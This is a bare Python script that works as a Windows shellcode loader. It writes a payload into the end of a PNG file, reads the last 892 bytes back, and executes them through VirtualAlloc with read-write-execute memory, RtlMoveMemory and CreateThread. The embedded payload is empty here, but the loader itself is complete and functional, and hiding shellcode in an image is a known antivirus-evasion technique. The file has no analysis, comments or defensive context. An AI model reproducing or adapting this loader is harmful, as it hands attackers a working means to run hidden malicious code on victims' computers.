import ctypes
import time

list = b""
png = open('a.png','ab+')
print(len(list))
png.write(list)
png.close()
print('写入完成')



time.sleep(2)
png = open('a.png','rb')
shellcode = png.read()[-892:]
print(shellcode)
print('ok')
#
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
